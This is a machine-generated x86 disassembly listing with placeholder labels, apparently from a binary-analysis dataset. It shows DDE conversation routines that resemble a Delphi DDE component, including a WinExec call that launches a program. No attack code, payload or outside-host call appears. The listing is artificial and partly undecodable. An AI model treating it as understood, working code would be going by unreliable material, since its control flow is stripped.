pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d63
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov bl 0x1
sub_469d6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_469cb8
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_469dd0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_469ea1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b54c
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404128
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_40408c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_469fdc
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_417414
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46a02c
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469ea8
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov si 0xffef
call sub_4034e4
sub_469eb4
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_4034e4
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_4176b4
mov eax ebx
call sub_4032e8
sub_469efc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469f98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_469fb0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4086f4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_40408c
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_40463c
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469f9f
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebx + 0x30 ]
call sub_4042f8
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404598
sub_469fb0
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_469fdc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_417570
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_408064
test eax eax
jne r-xdata
sub_46a02c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_46a0ae
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d498
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a0b5
lea eax [ ebp - 0xc ]
call sub_404038
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45d484
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_43fcb0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_408064
test eax eax
jne r-xdata
sub_46a0c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_417570
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_408064
test eax eax
jne r-xdata
sub_46a110
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_46a167
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_46a0c0
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a16e
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edx [ ebp - 0x4 ]
call sub_46ba34
test eax eax
je r-xdata
call sub_46bc18
sub_46a194
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46a1dc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_46a820
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
mov eax [ esi + 0x9c ]
call sub_4032e8
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46a21c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41d410
push ebx
push sub_46a2ec
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_46a269
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46a2e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d4e8
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_4040d0
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_4040d0
mov eax [ ebp - 0x4 ]
call sub_4042f8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a2e7
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46a5dc
sub_46a2ec
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46a397
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41b528
jmp r-xdata
mov eax esi
call sub_41a5c4
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41c1c8
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40463c
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404558
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_41b530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a39e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46aac4
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46aad8
jmp r-xdata
sub_46a3ab
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46a467
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41cd74
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_4040d0
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408f18
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_41ce1c
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_4040d0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408f18
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_41ce1c
mov eax ebx
call sub_41cd7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a46e
lea eax [ ebp - 0x14 ]
call sub_404038
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_46a49c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46adb0
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4175ec
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_46ae20
pop edi
pop esi
pop ebx
retn
sub_46a4d4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46a594
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_46ae20
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_4176b4
mov eax ebx
call sub_4032e8
sub_46a50c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_46a594
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4042f8
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4042f8
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_46a49c
mov edx edi
mov eax esi
call sub_46a594
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_46ae20
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46a4d4
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_46a4d4
sub_46a594
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_417570
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_46a5dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_46a820
mov edx ebx
mov eax esi
call sub_46aac4
mov edx edi
mov eax esi
call sub_46aad8
mov eax esi
call sub_46a62c
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_46aac4
xor edx edx
mov eax esi
call sub_46aad8
sub_46a62c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46a802
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a809
lea eax [ ebp - 0x108 ]
call sub_404038
retn
mov eax [ edi + 0x30 ]
call sub_4042f8
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_4042f8
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_4088e8
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_46a8a0
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_46a8e0
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_4088e8
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_4042f8
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_46a8a0
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_4042f8
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_4042f8
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_4043b8
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_4088e8
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_4088e8
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_4034e4
xor ecx ecx
xor edx edx
mov eax edi
call sub_46aa04
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_46a958
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_46a8e0
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_46a820
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_46a9c0
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_46aac4
xor edx edx
mov eax ebx
call sub_46aad8
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_46a8a0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_417570
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_46ac9c
dec bx
jne r-xdata
sub_46a8e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402cfc
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_46a958
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_417570
mov edi eax
mov eax edi
call sub_46b020
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_46ac9c
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_46a9c0
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_4034e4
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_417570
call sub_46b118
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46aa04
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_417570
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_46aecc
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_46aa44
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_4042f8
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_4042f8
test eax eax
je r-xdata
mov eax esi
call sub_46a62c
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_46ab2c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_41d3b4
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_417570
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_46ac9c
inc esi
sub_46aba0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46abe4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46ac14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ac8f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac96
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_4040d0
lea eax [ ebx + 0x38 ]
call sub_404038
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_46a4d4
mov edx ebx
call sub_41d168
mov eax [ ebp - 0x4 ]
call sub_4042f8
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ac9c
sub_46ac9c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40408c
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_46a50c
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40408c
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_404038
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_46acf8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41d3b4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_46a4d4
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_404038
sub_46ad34
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_403514
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46ad7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404038
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46adb0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46adf4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_46b0d8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417ae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46ae20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46aebd
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4040d0
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_40408c
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_4042f8
test eax eax
je r-xdata
mov eax esi
call sub_46b0d8
mov eax esi
call sub_46afa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aec4
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_46b020
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_404038
jmp r-xdata
sub_46aecc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46af99
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46b010
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_404230
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_46afa8
jmp r-xdata
mov eax ebx
call sub_46b138
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_46b018
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46afa0
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax [ ebp - 0x8 ]
call sub_4042f8
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_404504
mov [ eax + esi - 0x1 ] 0x20
sub_46afa8
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_46b138
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
